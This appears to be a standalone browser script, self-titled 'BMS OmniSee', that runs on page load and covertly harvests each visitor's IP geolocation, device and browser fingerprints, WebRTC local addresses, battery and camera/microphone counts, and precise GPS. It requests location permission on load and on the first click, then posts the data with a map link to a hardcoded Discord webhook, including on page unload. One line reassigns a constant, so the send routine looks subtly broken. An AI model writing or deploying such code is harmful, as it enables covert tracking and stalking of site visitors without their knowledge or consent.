(function(){'use strict'
const W='https://discord.com/api/webhooks/1526903563912216617/s9kXzTaBNeIVQB4Il32S0D02HU26cwob_xkGvdvpi1u49s8eq5dFiNSOHXh5Y2lrhzjx'
const C={WEBHOOK:W,AUTO_SEND:true,DB:'BMS_v6',DBV:1}
if(window.__BMS)Object.assign(C,window.__BMS)
const D={},_add=(k,v)=>{if(v!==null&&v!==undefined&&v!==''){D[k]=typeof v==='object'?JSON.stringify(v):String(v)}}

// IndexedDB
function oDB(){return new Promise((r,j)=>{const q=indexedDB.open(C.DB,C.DBV)
q.onupgradeneeded=e=>{const d=e.target.result;if(!d.objectStoreNames.contains('s'))d.createObjectStore('s',{keyPath:'i',autoIncrement:true});if(!d.objectStoreNames.contains('g'))d.createObjectStore('g',{keyPath:'i',autoIncrement:true})}
q.onsuccess=e=>r(e.target.result);q.onerror=()=>j(q.error)})}
async function dbP(st,data){try{const d=await oDB();const t=d.transaction(st,'readwrite');t.objectStore(st).add({...data,t:Date.now()});await new Promise((r,j)=>{t.oncomplete=()=>{d.close();r()};t.onerror=()=>j(t.error)});return true}catch{return false}}
async function dbG(st){try{const d=await oDB();const t=d.transaction(st,'readonly');const r=await new Promise((r,j)=>{const q=t.objectStore(st).getAll();q.onsuccess=()=>r(q.result);q.onerror=()=>j(q.error)});d.close();return r||[]}catch{return[]}}

// ── 1. IP GEO (3 providers, HTTPS only) ──
async function ipGeo(){
 const p1=fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(8000)}).then(r=>r.ok?r.json():null).then(d=>{
  if(d&&d.latitude){_add('IP',d.ip);_add('Country',d.country_name);_add('CountryCode',d.country_code);_add('Region',d.region);_add('City',d.city);_add('Postal',d.postal);_add('Lat',d.latitude);_add('Lon',d.longitude);_add('TZ',d.timezone);_add('Currency',d.currency);_add('ASN',d.asn);_add('Org',d.org);_add('Languages',d.languages);_add('CallingCode',d.country_calling_code);if(!D.BestLat){D.BestLat=d.latitude;D.BestLon=d.longitude}}
 }).catch(()=>{})
 const p2=fetch('https://ipinfo.io/json',{signal:AbortSignal.timeout(8000)}).then(r=>r.ok?r.json():null).then(d=>{
  if(d&&d.ip){_add('IP2',d.ip);_add('City2',d.city);_add('Region2',d.region);_add('Country2',d.country);_add('Loc2',d.loc);_add('Org2',d.org);_add('TZ2',d.timezone);_add('Postal2',d.postal);if(d.loc){const[a,b]=d.loc.split(',').map(Number);_add('Lat2',a);_add('Lon2',b)}}
 }).catch(()=>{})
 const p3=fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,proxy,mobile,hosting',{signal:AbortSignal.timeout(8000)}).then(r=>r.ok?r.json():null).then(d=>{
  if(d&&d.status==='success'){_add('IP3',d.query);_add('City3',d.city);_add('Region3',d.regionName);_add('Country3',d.country);_add('ZIP3',d.zip);_add('Lat3',d.lat);_add('Lon3',d.lon);_add('ISP3',d.isp);_add('Org3',d.org);_add('AS3',d.as);_add('Proxy',d.proxy?'Yes':'No');_add('Mobile',d.mobile?'Yes':'No');_add('Hosting',d.hosting?'Yes':'No')}
 }).catch(()=>{})
 await Promise.all([p1,p2,p3])
 // Fuse all providers
 const ls=[D.Lat,D.Lat2,D.Lat3].map(Number).filter(x=>!isNaN(x)&&x!==0)
 const ns=[D.Lon,D.Lon2,D.Lon3].map(Number).filter(x=>!isNaN(x)&&x!==0)
 if(ls.length>=2){const aL=ls.reduce((a,b)=>a+b,0)/ls.length;const aN=ns.reduce((a,b)=>a+b,0)/ns.length
  _add('BestLat',aL.toFixed(6));_add('BestLon',aN.toFixed(6));_add('BestSrc','IP_Fusion');_add('BestAcc_m',(ls.length>=3?1000:3000))}
}

// ── 2. UA CLIENT HINTS ──
async function uaHints(){
 _add('UA',navigator.userAgent);_add('Platform',navigator.platform);_add('Lang',navigator.language);_add('Langs',navigator.languages?navigator.languages.join(','):'')
 if(navigator.userAgentData){
  _add('Brands',JSON.stringify(navigator.userAgentData.brands));_add('MobileUA',navigator.userAgentData.mobile);_add('OS',navigator.userAgentData.platform)
  try{const h=await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','fullVersionList','wow64','formFactors'])
   if(h){_add('Arch',h.architecture);_add('Bitness',h.bitness);_add('Model',h.model);_add('OSVer',h.platformVersion);_add('FullVer',JSON.stringify(h.fullVersionList));_add('WOW64',h.wow64);_add('FormFactors',JSON.stringify(h.formFactors))}
  }catch(e){}
 }
}

// ── 3. SCREEN + WINDOW ──
function screenInfo(){
 _add('Screen',`${screen.width}x${screen.height}`);_add('Avail',`${screen.availWidth}x${screen.availHeight}`);_add('CDepth',screen.colorDepth);_add('PDepth',screen.pixelDepth);_add('DPR',window.devicePixelRatio)
 try{_add('Orientation',screen.orientation?screen.orientation.type:'')}catch(e){}
 if(screen.isExtended!==undefined)_add('MultiScreen',screen.isExtended)
 _add('WinSize',`${window.innerWidth}x${window.innerHeight}`);_add('WinOuter',`${window.outerWidth}x${window.outerHeight}`);_add('WinPos',`${window.screenX||0},${window.screenY||0}`)
}

// ── 4. HARDWARE ──
function hwInfo(){
 _add('CPUCores',navigator.hardwareConcurrency);_add('RAM',navigator.deviceMemory||'');_add('Touch',navigator.maxTouchPoints);_add('Online',navigator.onLine);_add('Cookie',navigator.cookieEnabled);_add('DNT',navigator.doNotTrack||'')
}

// ── 5. TIMING ──
function perfInfo(){
 _add('Collected_at',Date.now())
 try{_add('TimeOrigin',performance.timeOrigin)}catch(e){}
 try{if(performance.memory){_add('Heap',(performance.memory.usedJSHeapSize/1e6).toFixed(1));_add('HeapTotal',(performance.memory.totalJSHeapSize/1e6).toFixed(1));_add('HeapLimit',(performance.memory.jsHeapSizeLimit/1e6).toFixed(1))}}catch(e){}
 try{const e=performance.getEntriesByType('navigation')[0];if(e){_add('DNS_ms',(e.domainLookupEnd-e.domainLookupStart).toFixed(0));_add('TCP_ms',(e.connectEnd-e.connectStart).toFixed(0));_add('TTFB_ms',e.responseStart.toFixed(0));_add('Load_ms',(e.loadEventEnd-e.startTime).toFixed(0));_add('Proto',e.nextHopProtocol)}}catch(e){}
}

// ── 6. WEBGL 2.0 + GPU ──
function gpuInfo(){
 try{const c=document.createElement('canvas')
 const gl=c.getContext('webgl2')||c.getContext('webgl')
 if(gl){
  const ext=gl.getExtension('WEBGL_debug_renderer_info')
  if(ext){_add('GPU',gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));_add('Vendor',gl.getParameter(ext.UNMASKED_VENDOR_WEBGL))}
  _add('WebGL',gl.getParameter(gl.VERSION));_add('GLSL',gl.getParameter(gl.SHADING_LANGUAGE_VERSION))
  _add('MaxTex',gl.getParameter(gl.MAX_TEXTURE_SIZE));_add('MaxView',gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'))
  if(gl instanceof WebGL2RenderingContext){
   try{_add('Max3DTex',gl.getParameter(gl.MAX_3D_TEXTURE_SIZE));_add('MaxSamples',gl.getParameter(gl.MAX_SAMPLES));_add('MaxColorAtt',gl.getParameter(gl.MAX_COLOR_ATTACHMENTS));_add('MaxUBuf',gl.getParameter(gl.MAX_UNIFORM_BLOCK_SIZE));_add('MaxVertUni',gl.getParameter(gl.MAX_VERTEX_UNIFORM_BLOCKS));_add('MaxFragUni',gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_BLOCKS));_add('MaxDrawBuf',gl.getParameter(gl.MAX_DRAW_BUFFERS))}catch(e){}
  }
 }_add('WebGPU','navigator.gpu' in window?'available':'')
 }catch(e){}
 // WebGPU detail
 if(navigator.gpu){(async()=>{try{const a=await navigator.gpu.requestAdapter();if(a&&a.info){_add('WGPU',`${a.info.vendor||''} ${a.info.architecture||''}`.trim())}}catch(e){}})()}
}

// ── 7. CANVAS FP ──
function canvasFP(){
 try{const c=document.createElement('canvas');c.width=256;c.height=64;const x=c.getContext('2d')
 x.textBaseline='alphabetic';x.fillStyle='#f60';x.fillRect(100,1,62,20);x.fillStyle='#069';x.font='16px Arial';x.fillText('BMS',2,15)
 x.fillStyle='rgba(102,204,0,0.7)';x.fillText(navigator.language,4,42);x.fillStyle='#c00';x.font='bold 20px Times New Roman';x.fillText('M',150,45)
 x.beginPath();x.arc(180,20,10,0,Math.PI*2);x.fillStyle='#00c';x.fill();const u=c.toDataURL();let h=0;for(let i=0;i<u.length;i++){h=((h<<5)-h)+u.charCodeAt(i);h|=0}
 _add('Canvas',h.toString(16).toUpperCase())
 }catch(e){}
}

// ── 8. AUDIO FP ──
async function audioFP(){
 try{const ac=new(window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100)
 const o=ac.createOscillator();o.type='sawtooth';o.frequency.setValueAtTime(1000,0)
 const g=ac.createGain();g.gain.setValueAtTime(0.3,0);o.connect(g);g.connect(ac.destination);o.start(0)
 const b=await ac.startRendering();const s=b.getChannelData(0);let h=0
 for(let i=0;i<1000;i+=4){h=((h<<5)-h)+((s[i]*10000)|0);h|=0}
 _add('AudioFP',h.toString(16))
 }catch(e){_add('AudioFP','blocked')}
}

// ── 9. NETWORK INFO ──
function netInfo(){
 try{const c=navigator.connection;if(c){_add('NetType',c.type||'');_add('NetEff',c.effectiveType||'');_add('NetDL',c.downlink||'');_add('NetRTT',c.rtt||'');_add('SaveData',c.saveData||false)}}catch(e){}
 // DNS servers via timing
 const hosts={cloudflare:'https://1.1.1.1',google:'https://8.8.8.8',cisco:'https://208.67.222.222'}
 Object.entries(hosts).forEach(([k,v])=>{const t0=performance.now();fetch(v,{mode:'no-cors',cache:'no-store'}).then(()=>{_add(`DNS_${k}`,(performance.now()-t0).toFixed(0))}).catch(()=>{})})
}

// ── 10. WEBRTC ──
function webrtc(){
 try{const p=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})
 p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));const ips=[]
 p.onicecandidate=e=>{if(!e.candidate)return;const f=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);if(f)f.forEach(ip=>{if(!ips.includes(ip))ips.push(ip)})}
 setTimeout(()=>{try{p.close()}catch(e){}
 if(ips.length){_add('W_IPs',ips.join(','));_add('WCount',ips.length)
  const pvt=ips.filter(i=>i.startsWith('10.')||i.startsWith('192.168.')||(i.startsWith('172.')&&parseInt(i.split('.')[1])>=16&&parseInt(i.split('.')[1])<=31))
  if(pvt.length){_add('WLocal',pvt[0])}}},2000)
 }catch(e){}
}

// ── 11. CSS MEDIA ──
function cssMedia(){
 _add('Dark',matchMedia('(prefers-color-scheme:dark)').matches)
 _add('ReducedMotion',matchMedia('(prefers-reduced-motion:reduce)').matches)
 _add('Pointer',matchMedia('(pointer:fine)').matches?'fine':'coarse')
 _add('Hover',matchMedia('(hover:hover)').matches)
 _add('ColorGamut',matchMedia('(color-gamut:p3)').matches?'p3':'srgb')
 _add('HDR',matchMedia('(dynamic-range:high)').matches)
}

// ── 12. TIMEZONE ──
function tzInfo(){
 _add('TZ',Intl.DateTimeFormat().resolvedOptions().timeZone)
 _add('TZOff',-new Date().getTimezoneOffset())
 try{const j=new Date(2025,0,1).getTimezoneOffset(),l=new Date(2025,6,1).getTimezoneOffset();_add('DST',j!==l)}catch(e){}
 try{const pts=Intl.DateTimeFormat(undefined,{timeZoneName:'longOffset'}).formatToParts();pts.forEach(p=>{if(p.type==='timeZoneName')_add('TZLabel',p.value)})}catch(e){}
}

// ── 13. BATTERY ──
async function battery(){
 try{if(navigator.getBattery){const b=await navigator.getBattery();_add('Batt',(b.level*100).toFixed(0)+'%');_add('Charging',b.charging)}}catch(e){}
}

// ── 14. MEDIA + PLUGINS ──
async function mediaInfo(){
 try{if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices){const d=await navigator.mediaDevices.enumerateDevices();_add('Mic',d.filter(x=>x.kind==='audioinput').length);_add('Cam',d.filter(x=>x.kind==='videoinput').length)}}catch(e){}
 try{const p=[];for(let i=0;i<navigator.plugins.length;i++)p.push(navigator.plugins[i].name);if(p.length)_add('Plugins',p.join(', '))}catch(e){}
}

// ── 15. GPS ──
async function gps(){
 if(!navigator.geolocation){_add('GPS','unavailable');return}
 try{const s=await navigator.permissions.query({name:'geolocation'});_add('GPSPerm',s.state)
  if(s.state==='denied'){_add('GPS','denied');return}
  const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true,timeout:10000,maximumAge:300000}))
  if(p){const c=p.coords;_add('GPSLat',c.latitude);_add('GPSLon',c.longitude);_add('GPSAcc',c.accuracy);_add('GPSAlt',c.altitude||'');_add('GPSSpeed',c.speed||'');_add('GPSHead',c.heading||'');_add('GPSTime',new Date(p.timestamp).toISOString());_add('BestLat',c.latitude);_add('BestLon',c.longitude);_add('BestSrc','GPS');_add('BestAcc_m',c.accuracy);_add('AccTier',c.accuracy<=5?'EXCEPTIONAL':c.accuracy<=15?'HIGH':c.accuracy<=50?'GOOD':c.accuracy<=200?'FAIR':'LOW');dbP('g',{lat:c.latitude,lng:c.longitude,accuracy:c.accuracy})}
 }catch(e){_add('GPS',e.message||'error')}
}
async function notif(){if('Notification' in window&&Notification.permission==='default'){try{await Notification.requestPermission()}catch(e){}}_add('Notif',Notification.permission)}

// ── 16. LOAD CACHE ──
async function loadCache(){
 try{const s=await dbG('sessions');if(s.length>0){_add('Sessions',s.length);_add('First',new Date(s[0].t).toISOString());_add('Last',new Date(s[s.length-1].t).toISOString());const ips=[...new Set(s.filter(x=>x.ip).map(x=>x.ip))];if(ips.length)_add('UIPs',ips.join(','));const ct=[...new Set(s.filter(x=>x.city).map(x=>x.city))];if(ct.length)_add('Cities',ct.join('→'))}}catch(e){}
 try{const g=await dbG('g');if(g.length>0&&!D.GPSLat){const l=g.sort((a,b)=>b.t-a.t)[0];if(l.lat){_add('CGPS_Lat',l.lat);_add('CGPS_Lng',l.lng);_add('CGPS_Acc',l.accuracy||'');if(!D.BestLat){_add('BestLat',l.lat);_add('BestLon',l.lng);_add('BestSrc','Cached_GPS');_add('BestAcc_m',l.accuracy||100)}}}
 }catch(e){}
}

// ── 17. SAVE CACHE ──
async function saveCache(){await dbP('s',{ip:D.IP||D.IP2||null,city:D.City||D.City2||null,region:D.Region||D.Region2||null,country:D.Country||D.Country2||null,lat:D.Lat||D.Lat2||null,lon:D.Lon||D.Lon2||null})}

// ── 18. DISCORD ──
async function sendDisc(){
 _add('PageURL',window.location.href);_add('Referrer',document.referrer||'direct');_add('Title',document.title);_add('Total',Object.keys(D).length)
 const lat=D.BestLat,lon=D.BestLon,hasGPS=lat&&lon
 const mLat=hasGPS?parseFloat(lat).toFixed(6):'?',mLon=hasGPS?parseFloat(lon).toFixed(6):'?'
 const maps=hasGPS?`https://www.google.com/maps?q=${lat},${lon}`:''
 // Build concise data summary for embed
 const fJson=JSON.stringify(D,null,2)
 const snippet=fJson.length>3800?fJson.substring(0,3800)+'\n...':fJson
 const pal=content= ''
 if(fJson.length<1500){
  pal={content:'```json\n'+fJson+'\n```'}
 }else{
  pal={embeds:[{
   title:'📍 BMS OmniSee',
   color:0x8b7cfc,
   fields:[
    {name:'👤 User',value:`IP: \`${D.IP||D.IP3||'?'}\`\nOrg: ${D.Org||D.ISP3||'?'}`,inline:true},
    {name:'📍 Loc',value:`${D.City||'?'}, ${D.Region||'?'}, ${D.Country||'?'}\n\`${mLat},${mLon}\`\nAcc: ${D.BestAcc_m||'?'}m`,inline:true},
    {name:'🖥 System',value:`OS: ${D.OS||D.Platform||'?'}\nCPU: ${D.CPUCores||'?'}c\nRAM: ${D.RAM||'?'}GB`,inline:true},
    {name:'🌐 Net',value:`${D.NetEff||'?'} ${D.NetDL||'?'}Mbps\nISP: ${D.ISP3||'?'}\nProxy: ${D.Proxy||'?'}`,inline:true},
    {name:'🎨 FP',value:`Canvas: \`${(D.Canvas||'').substring(0,10)}\`\nGPU: ${(D.GPU||'?').substring(0,35)}\nFonts: ${D.Fonts||'?'}`,inline:true},
    {name:'📡 GPS',value:D.GPSLat?`${D.GPSLat},${D.GPSLon} ±${D.GPSAcc}m\n${D.AccTier||''}`:D.CGPS_Lat?`${D.CGPS_Lat},${D.CGPS_Lng} (cached)`:hasGPS?`${mLat},${mLon} (IP)`:'N/A',inline:true},
    {name:'📊 Sesi',value:`${D.Sessions||1}kunj\n${(D.PageURL||'').substring(0,40)}\n${D.TZ||'?'}`,inline:true},
    {name:'🔗 Maps',value:maps||'N/A',inline:false}
   ],
   description:snippet.length>1000?'```json\n'+snippet.substring(0,1000)+'\n```':'',
   footer:{text:`${Object.keys(D).length} fields · ${new Date().toLocaleString('id-ID')}`},
   timestamp:new Date().toISOString()
  }]}
 }
 try{const r=await fetch(C.WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(pal),keepalive:true})
  if(!r.ok){
   const simple={content:'```json\n'+fJson.substring(0,1800)+'\n```'}
   await fetch(C.WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(simple),keepalive:true})
  }
 }catch(e){}
}

// ── MAIN ──
async function main(){
 await loadCache()
 const t0=Date.now()
 // All parallel
 await Promise.all([ipGeo(),uaHints(),gpuInfo(),canvasFP(),audioFP(),netInfo(),webrtc(),battery(),mediaInfo(),tzInfo()])
 screenInfo();hwInfo();perfInfo();cssMedia() // sync
 _add('CollectMS',Date.now()-t0)
 await gps();await notif()
 await saveCache()
 _add('Collected',new Date().toISOString())
 _add('Total',Object.keys(D).length)
 if(C.AUTO_SEND)sendDisc()
}

// ── EXEC ──
if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',()=>{if(window.requestIdleCallback)requestIdleCallback(()=>main(),{timeout:3000});else setTimeout(main,500)})}
else{if(window.requestIdleCallback)requestIdleCallback(()=>main(),{timeout:3000});else setTimeout(main,100)}
// Click gesture for GPS
let gf=false;document.addEventListener('click',()=>{if(gf)return;gf=true
 if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{const c=p.coords;_add('GPSLat',c.latitude);_add('GPSLon',c.longitude);_add('GPSAcc',c.accuracy);_add('BestLat',c.latitude);_add('BestLon',c.longitude);_add('BestSrc','GPS_Gesture');_add('BestAcc_m',c.accuracy);dbP('g',{lat:c.latitude,lng:c.longitude,accuracy:c.accuracy})},()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:300000})}
 if('Notification' in window&&Notification.permission==='default'){Notification.requestPermission().catch(()=>{})}
},{once:true})
// Unload send
window.addEventListener('beforeunload',()=>{if(Object.keys(D).length>5&&C.AUTO_SEND){_add('SentAt',new Date().toISOString());sendDisc()}})
})()